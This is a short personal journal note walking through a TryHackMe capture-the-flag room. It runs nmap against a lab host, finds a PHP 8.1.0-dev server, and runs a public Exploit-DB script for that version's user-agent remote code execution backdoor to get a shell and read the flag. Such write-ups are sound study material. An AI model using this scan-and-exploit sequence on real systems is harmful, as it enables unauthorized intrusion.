---
created: 2026-10-27
tags:
  - note
  - journal
  - cyber
  - cyberStuff
title: agentT
date: 2026-10-27T09:05:30.306Z
lastmod: 2026-10-27T13:26:12.253Z
---
very lazy room , on thm the time estimated in 10 minutes , i think it takes only tree\
run nmap to enumerate

```
nmap 10.10.197.199 -sV -sC`

Starting Nmap 7.93 ( https://nmap.org )

PORT STATE SERVICE VERSION`

80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev)`

|_http-title: Admin Dashboard
```

the only port opened in 80 , and we see the php version as being 8.1.0\
we dont even need to access the site for this one

Heading over to [https://www.exploit-db.com](https://www.exploit-db.com/) we find that PHP 8.1.0 is vulnerable to remote code execution by changing our user agent , the cve link  <https://www.exploit-db.com/exploits/49933>\
download the cve and run it

```
chmod +x 49933.py
python3 49933.py
```

tge script asks for our targer link , paste the whole url

`http://YOUR_TARGET`

now we have a shell , just run

```
cat /fag.txt
```
